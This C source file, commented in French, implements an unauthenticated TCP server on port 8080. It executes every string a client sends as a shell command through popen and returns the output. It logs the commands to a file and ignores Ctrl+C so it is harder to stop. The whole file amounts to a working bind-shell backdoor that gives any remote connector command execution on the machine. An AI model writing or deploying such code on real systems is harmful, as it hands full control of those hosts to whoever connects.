#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>

// Définition du port
#define PORT 8080

// Fonction pour ajouter une commande au fichier de log
void log_command(char* command) {
    FILE* log_file = fopen("./log.txt", "a");                    // Ouvrir le fichier de log en mode ajout
    time_t current_time;                                        // Obtenir l'heure actuelle et la formater en chaîne de caractères
    char* time_string;
    time(&current_time);
    time_string = ctime(&current_time);                         
    time_string[strlen(time_string)-1] = '\0';                  // enlever le caractère de fin de ligne
    fprintf(log_file, "[%s] %s\n", time_string, command);       // Écrire la commande dans le fichier de log avec l'heure actuelle
    fclose(log_file);                                           // Fermer le fichier de log
}

// Fonction principale
int main(int argc, char const *argv[]) {                        // Initialisation des variables
    int server_fd, new_socket, valread;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[1024];

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {   // Création de la socket 
        perror("socket échouée");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {// Configuration de la socket pour réutiliser l'adresse IP et le port
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) { // Reliage de la socket au port 8080
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0) {                             // Attachement de la socket au port 8080
        perror("listen échouée");
        exit(EXIT_FAILURE);
    }


    signal(SIGINT, SIG_IGN);                                    // Masquer les signaux SIGINT pour ne pas être fermé par CTRL+c

// Boucle d'attente des connexions et de traitement des commandes
    while(1) { 
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {// Accepter une nouvelle connexion
            perror("accept échouée");
            exit(EXIT_FAILURE);
        }
        
        while(1) {                                              // Boucle de traitement des commandes
            memset(buffer, 0, sizeof(buffer));
            valread = read(new_socket, buffer, 1024);
            if (valread <= 0) {         
                break;                                          // Connexion interrompue
            }
            log_command(buffer);                                // Ajouter la commande au fichier de log
            FILE* command_output = popen(buffer, "r");          // Exécuter la commande et envoyer le résultat au client
            char output_buffer[1024] = {0};
            while (fgets(output_buffer, sizeof(output_buffer), command_output) != NULL) {
                send(new_socket, output_buffer, strlen(output_buffer), 0);
            }
            pclose(command_output);
        }

        close(new_socket);                                      // Fermer la connexion
    }

    return 0;
}
